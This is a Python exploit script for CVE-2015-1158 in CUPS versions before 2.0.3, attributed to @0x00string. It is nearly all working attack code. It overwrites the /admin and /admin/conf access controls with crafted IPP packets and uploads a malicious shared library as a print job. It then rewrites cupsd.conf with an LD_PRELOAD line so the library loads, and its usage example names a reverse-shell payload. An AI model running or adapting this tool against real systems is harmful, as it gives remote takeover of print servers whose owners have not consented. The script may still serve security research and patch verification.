#!/usr/bin/python
# Exploit Title: CUPS Reference Count Over Decrement Remote Code Execution
# Google Dork: n/a
# Date: 2/2/17
# Exploit Author: @0x00string
# Vendor Homepage: cups.org
# Software Link: https://github.com/apple/cups/releases/tag/release-2.0.2
# Version: <2.0.3
# Tested on: Ubuntu 14/15
# CVE : CVE-2015-1158
import os, re, socket, random, time, getopt, sys
from socket import *
from struct import *

def banner():
    print '''
             lol ty google
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
              @0x00string
https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py
'''

def usage ():
    print   ("python script.py <args>\n"
            "   -h, --help:             Show this message\n"
            "   -a, --rhost:            Target IP address\n"
            "   -b, --rport:            Target IPP service port\n"
            "   -c, --lib               /path/to/payload.so\n"
            "   -f, --stomp-only        Only stomp the ACL (no postex)\n"
            "\n"
            "Examples:\n"
            "python script.py -a 10.10.10.10 -b 631 -f\n"
            "python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so\n")
    exit()

def pretty (t, m):
        if (t is "+"):
                print "\x1b[32;1m[+]\x1b[0m\t" + m + "\n",
        elif (t is "-"):
                print "\x1b[31;1m[-]\x1b[0m\t" + m + "\n",
        elif (t is "*"):
                print "\x1b[34;1m[*]\x1b[0m\t" + m + "\n",
        elif (t is "!"):
                print "\x1b[33;1m[!]\x1b[0m\t" + m + "\n",

def createDump (input):
        d, b, h = '', [], []
        u = list(input)
        for e in u:
                h.append(e.encode("hex"))
                if e == '0x0':
                        b.append('0')
                elif 30 > ord(e) or ord(e) > 128:
                        b.append('.')
                elif 30 < ord(e) or ord(e) < 128:
                        b.append(e)

        i = 0
        while i < len(h):
                if (len(h) - i ) >= 16:
                        d += ' '.join(h[i:i+16])
                        d += "         "
                        d += ' '.join(b[i:i+16])
                        d += "\n"
                        i = i + 16
                else:
                        d += ' '.join(h[i:(len(h) - 0 )])
                        pad = len(' '.join(h[i:(len(h) - 0 )]))
                        d += ' ' * (56 - pad)
                        d += ' '.join(b[i:(len(h) - 0 )])
                        d += "\n"
                        i = i + len(h)

        return d

class tcpsock:
    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket(
            AF_INET, SOCK_STREAM)
            self.sock.settimeout(30)
        else:
            self.sock = sock
    def connect(self, host, port):
        self.sock.connect((host, int(port)))
    def tx(self, msg):
        self.sock.send(msg)
    def rx(self):
        tmp  = self.sock.recv(1024)
        msg = ""
        while tmp:
            msg += tmp
            tmp  = self.sock.recv(1024)
        return msg

def txrx (ip, port, proto, txpacket):
    if (proto is "tcp"):
        sock = tcpsock()
    elif (proto is "udp"):
        sock = udpsock()
    else:
        return None
    sock.connect(ip, port)
    sock.tx(txpacket)
    rxpacket = sock.rx()
    return rxpacket

def locatePrinters(rhost, rport="631"):
    request = ( "GET /printers HTTP/1.1\x0d\x0a"
        "Host: " + rhost + ":" + rport + "\x0d\x0a"
        "User-Agent: CUPS/2.0.2\x0d\x0a"
        "Connection: Close\x0d\x0a"
        "\x0d\x0a")
    response = txrx(rhost, int(rport), "tcp", request)
    if response is not None:
        m = re.search('<TR><TD><A HREF="(.+)">.+</A></TD><TD>.+</TD><TD></TD><TD>.+</TD><TD>', response)
        if m is not None:
            printer = m.group(1)
            pretty("+","printer found: " + printer)
            return printer
        else:
            pretty("-","no printers")
            exit(1)
    else:
        pretty("-","no printers")
        exit(1)

def preparePayload(libpath):
    with open(libpath, 'rb') as f:
        payload = f.read()
    if payload is not None:
        pretty("*","Payload:\n" + createDump(payload))
    else:
        pretty("-","something went wrong")
        usage()
    return payload

def seedTarget(rhost, rport, printer, payload):
    i = random.randint(1,3)
    reqid = str(pack(">i",(i+2)))
    reqid2 = str(pack(">i",(i+3)))
    printer_uri = "ipp://" + rhost + ":" + str(rport) + printer

    create_job_packet = ("\x02\x00"
                         "\x00\x05"+
                         reqid+
                         "\x01"
                         "\x47"+"\x00\x12"+"attributes-charset"+"\x00\x05"+"utf-8"
                         "\x48"+"\x00\x1b"+"attributes-natural-language"+"\x00\x05"+"en-us"
                         "\x45"+"\x00\x0b"+"printer-uri" + str(pack(">h", len(printer_uri))) + printer_uri +
                         "\x42"+"\x00\x14"+"requesting-user-name"+"\x00\x04"+"root"
                         "\x42"+"\x00\x08"+"job-name"+"\x00\x06"+"badlib"
                         "\x02"
                         "\x21"+"\x00\x06"+"copies"+"\x00\x04"+"\x00\x00\x00\x01"
                         "\x23"+"\x00\x0a"+"finishings"+"\x00\x04"+"\x00\x00\x00\x03"
                         "\x42"+"\x00\x10"+"job-cancel-after"+"\x00\x05"+"\x31\x30\x38\x30\x30"
                         "\x44"+"\x00\x0e"+"job-hold-until"+"\x00\x0a"+"indefinite"
                         "\x21"+"\x00\x0c"+"job-priority"+"\x00\x04"+"\x00\x00\x00\x32"
                         "\x42"+"\x00\x0a"+"job-sheets"+"\x00\x04"+"none"+"\x42"+"\x00\x00\x00\x04"+"none"
                         "\x21"+"\x00\x09"+"number-up"+"\x00\x04"+"\x00\x00\x00\x01"
                         "\x03")
    pretty("*","Sending createJob")

    http_header1 = ( "POST " + printer + " HTTP/1.1\x0d\x0a"
                        "Content-Type: application/ipp\x0d\x0a"
                        "Host: " + rhost + ":" + str(rport) + "\x0d\x0a"
                        "User-Agent: CUPS/2.0.2\x0d\x0a"
                        "Connection: Close\x0d\x0a"
                        "Content-Length: " + str(len(create_job_packet) + 0) + "\x0d\x0a"
                        "\x0d\x0a")

    createJobRequest = http_header1 + create_job_packet
    blah = txrx(rhost,int(rport),"tcp",createJobRequest)
    if blah is not None:
        m = re.search("ipp://" + rhost + ":" + str(rport) + "/jobs/(\d+)",blah)
        if m is not None:
            jobid = m.group(1)
    else:
        pretty("-","something went wrong");
        exit()

    pretty("*","\n" + createDump(blah) + "\n")
    pretty("*", "Sending sendJob")

    send_document_packet = ("\x02\x00"
                            "\x00\x06"+
                            reqid2+
                            "\x01"
                            "\x47"+"\x00\x12"+"attributes-charset"+"\x00\x05"+"utf-8"
                            "\x48"+"\x00\x1b"+"attributes-natural-language"+"\x00\x05"+"en-us"
                            "\x45"+"\x00\x0b"+"printer-uri" + str(pack(">h", len(printer_uri))) + printer_uri +
                            "\x21"+"\x00\x06"+"job-id"+"\x00\x04"+ str(pack(">i", int(jobid))) +
                            "\x42"+"\x00\x14"+"requesting-user-name"+"\x00\x04"+"root"
                            "\x42"+"\x00\x0d"+"document-name"+"\x00\x06"+"badlib"
                            "\x49"+"\x00\x0f"+"document-format"+"\x00\x18"+"application/octet-stream"
                            "\x22"+"\x00\x0d"+"last-document"+"\x00\x01"+"\x01"
                            "\x03"+
                            payload)

    http_header2 = ( "POST " + printer + " HTTP/1.1\x0d\x0a"
                        "Content-Type: application/ipp\x0d\x0a"
                        "Host: " + rhost + ":" + str(rport) + "\x0d\x0a"
                        "User-Agent: CUPS/2.0.2\x0d\x0a"
                        "Connection: Close\x0d\x0a"
                        "Content-Length: " + str(len(send_document_packet) + 0) + "\x0d\x0a"
                        "\x0d\x0a")

    sendJobRequest = http_header2 + send_document_packet
    blah2 = txrx(rhost,int(rport),"tcp",sendJobRequest)
    pretty("*","\n" + createDump(blah) + "\n")
    pretty("*","job id: " + jobid)
    return jobid

def stompACL(rhost, rport, printer):
    i = random.randint(1,1024)
    printer_url = "ipp://" + rhost + ":" + rport + printer

    admin_stomp = ("\x02\x00"      #   vers 2.0
                "\x00\x05"+     #   op id: Create Job (0x0005)
                str(pack(">i",(i+1)))+
                "\x01"      #   op attributes marker
                "\x47"      #   charset
                "\x00\x12"      #   name len: 18
                "attributes-charset"
                "\x00\x08"      #   val len: 8
                "us-ascii"
                "\x48"      #   natural language
                "\x00\x1b"      #   name len: 27
                "attributes-natural-language"
                "\x00\x06"      #   val len: 6
                "/admin"
                "\x45"      #   printer-uri
                "\x00\x0b"      #   name len 11
                "printer-uri" +
                str(pack(">h", len(printer_url))) + printer_url +
                "\x42"      #   name without lang
                "\x00\x14"      #   name len: 20
                "requesting-user-name"
                "\x00\x06"      #   val len: 6
                "/admin"
                "\x02"      #   job attrs marker
                "\x21"      #   integer
                "\x00\x06"      #   name len: 6
                "copies"
                "\x00\x04"      #   val len: 4
                "\x00\x00\x00\x01"  #   1
                "\x42"      #   name w/o lang
                "\x00\x19"      #   name len: 25
                "job-originating-host-name"
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x36"      #   nwl
                "\x00\x00"      #   name len: 0
                "\x00\x16"      #   val len: 22
                "\x00\x06"      #   length
                "/admin"
                "\x00\x0c"
                "BBBBBBBBBBBB"
                "\x03")      #   end of attributes

    conf_stomp = ("\x02\x00"        #   vers 2.0
                "\x00\x05"+     #   op id: Create Job (0x0005)
                str(pack(">i",(i+2)))+
                "\x01"      #   op attributes marker
                "\x47"      #   charset
                "\x00\x12"      #   name len: 18
                "attributes-charset"
                "\x00\x08"      #   val len: 8
                "us-ascii"
                "\x48"      #   natural language
                "\x00\x1b"      #   name len: 27
                "attributes-natural-language"
                "\x00\x0b"      #   val len: 11
                "/admin/conf"
                "\x45"      #   printer-uri
                "\x00\x0b"      #   name len 11
                "printer-uri" +
                str(pack(">h", len(printer_url))) + printer_url +
                "\x42"      #   name without lang
                "\x00\x14"      #   name len: 20
                "requesting-user-name"
                "\x00\x0b"      #   val len: 11
                "/admin/conf"
                "\x02"      #   job attrs marker
                "\x21"      #   integer
                "\x00\x06"      #   name len: 6
                "copies"
                "\x00\x04"      #   val len: 4
                "\x00\x00\x00\x01"  #   1
                "\x42"      #   name w/o lang
                "\x00\x19"      #   name len: 25
                "job-originating-host-name"
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x36"      #   nwl
                "\x00\x00"      #   name len: 0
                "\x00\x1b"      #   val len: 27
                "\x00\x0b"      #   length
                "/admin/conf"
                "\x00\x0c"
                "BBBBBBBBBBBB"
                "\x03")      #   end of attributes

    http_header1 = ("POST " + printer + " HTTP/1.1\x0d\x0a"
                    "Content-Type: application/ipp\x0d\x0a"
                    "Host: " + rhost + ":" + rport + "\x0d\x0a"
                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                    "Connection: Close\x0d\x0a"
                    "Content-Length: " + str(len(admin_stomp)) + "\x0d\x0a"
                    "\x0d\x0a")

    http_header2 = ("POST " + printer + " HTTP/1.1\x0d\x0a"
                    "Content-Type: application/ipp\x0d\x0a"
                    "Host: " + rhost + ":" + rport + "\x0d\x0a"
                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                    "Connection: Close\x0d\x0a"
                    "Content-Length: " + str(len(conf_stomp)) + "\x0d\x0a"
                    "\x0d\x0a")

    pretty("*","stomping ACL")
    pretty("*",">:\n" + createDump(http_header1 + admin_stomp))
    pretty("*","<:\n" + createDump(txrx(rhost,rport,"tcp",http_header1 + admin_stomp)))
    time.sleep(1)
    pretty("*",">:\n" + createDump(http_header2 + conf_stomp))
    pretty("*","<:\n" + createDump(txrx(rhost,rport,"tcp",http_header2 + conf_stomp)))

    http_header_check = ("GET /admin HTTP/1.1\x0d\x0a"
                        "Host: " + rhost + ":" + rport + "\x0d\x0a"
                        "User-Agent: CUPS/2.0.2\x0d\x0a"
                        "Connection: Close\x0d\x0a"
                        "\x0d\x0a")
    pretty("*","checking /admin")
    pretty("*",">:\n" + createDump(http_header_check))
    res = txrx(rhost,rport,"tcp",http_header_check)
    pretty("*","<:\n" + createDump(res))
    m = re.search('200 OK', res)
    if m is not None:
        pretty("+","ACL stomp successful")
    else:
        pretty("-","exploit failed")
        exit(1)


def getConfig(rhost, rport):
    i = random.randint(1,1024)
    original_config = ""
    http_request = ("GET /admin/conf/cupsd.conf HTTP/1.1\x0d\x0a"
                    "Host: " + rhost + ":" + rport + "\x0d\x0a"
                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                    "Connection: Close\x0d\x0a"
                    "\x0d\x0a")

    pretty("*","grabbing configuration file....")
    res = txrx(rhost,rport,"tcp",http_request)
    res_array = res.split("\x0d\x0a\x0d\x0a")
    original_config = res_array[1]
    pretty("*","config:\n" + original_config + "\n")
    return original_config

def putConfig(rhost, rport, config):
    http_request = ("PUT /admin/conf/cupsd.conf HTTP/1.1\x0d\x0a"
                    "Content-Type: application/ipp\x0d\x0a"
                    "Host: " + rhost + ":" + rport + "\x0d\x0a"
                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                    "Connection: Keep-Alive\x0d\x0a"
                    "Content-Length: " + str(len(config)) + "\x0d\x0a"
                    "\x0d\x0a")
    pretty("*","overwriting config...")
    pretty("*",">:\n" + createDump(http_request + config))
    pretty("*","<:\n" + createDump(txrx(rhost,rport,"tcp",http_request + config)))

def poisonConfig(config, name):
    config = config + "\x0a\x0aSetEnv LD_PRELOAD /var/spool/cups/d000" + name + "-001\x0a"
    return config

def main():
    rhost = None;
    rport = None;
    noshell = None;
    options, remainder = getopt.getopt(sys.argv[1:], 'a:b:c:fh', ['rhost=','rport=','lib=','stomp-only','help'])
    for opt, arg in options:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-a','--rhost'):
            rhost = arg;
        elif opt in ('-b','--rport'):
            rport = arg;
        elif opt in ('-c','--lib'):
            libpath = arg;
        elif opt in ('-f','--stomp-only'):
            noshell = 1;
    banner()
    if rhost is None or rport is None:
        usage()
    pretty("*","locate available printer")
    printer = locatePrinters(rhost, rport)
    pretty("*","stomp ACL")
    stompACL(rhost, rport, printer)
    if (noshell is not None):
        pretty("*","fin")
        exit(0)
    pretty("*","prepare payload")
    payload = preparePayload(libpath)
    pretty("*","spray payload")
    jobid = seedTarget(rhost, rport, printer, payload)
    pretty("*","grab original config")
    OG_config = getConfig(rhost, rport)
    pretty("*","generate poison config")
    evil_config = poisonConfig(OG_config, jobid)
    pretty("*","upload poison config")
    putConfig(rhost, rport, evil_config)
    pretty("*","fin")
    exit(0);

if __name__ == "__main__":
    main()